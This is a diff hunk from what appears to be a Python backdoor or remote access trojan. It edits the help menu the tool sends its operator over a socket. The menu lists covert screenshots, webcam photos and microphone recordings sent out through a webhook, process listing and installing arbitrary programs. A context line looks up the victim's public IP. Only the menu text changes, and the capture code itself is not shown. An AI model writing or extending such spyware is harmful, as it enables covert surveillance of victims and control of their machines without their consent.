@@ -26,14 +26,14 @@ ipadd = get('https://api.ipify.org').text
 
 class back:
     def help_desk(self):
-        self.help_ = ("===========================================================\n"+
-                    "|| 1.) bye              -- To close the session             ||\n"+
-                    "|| 2.) screen -webhook  -- To take screenshot.              ||\n"+
-                    "|| 3.) cam -webhook     -- To take webcam photo.            ||\n"+
-                    "|| 4.) record t c web   -- To record sound from Mic.        ||\n"+
-                    "|| 5.) list -id         -- To list the process id.          ||\n"+
-                    "|| 6.) install          -- To install any program.          ||\n"
-                    "===========================================================\n")
+        self.help_ = ("===============================================================\n"+
+                    "|| 1.) bye                 -- To close the session             ||\n"+
+                    "|| 2.) screen -webhook     -- To take screenshot.              ||\n"+
+                    "|| 3.) webcam -webhook     -- To take webcam photo.            ||\n"+
+                    "|| 4.) record t c web      -- To record sound from Mic.        ||\n"+
+                    "|| 5.) list                -- To list the process id.          ||\n"+
+                    "|| 6.) install             -- To install any program.          ||\n"
+                    "===============================================================\n")
         s.send(self.help_.encode())
 
     def screenshot(self, url):
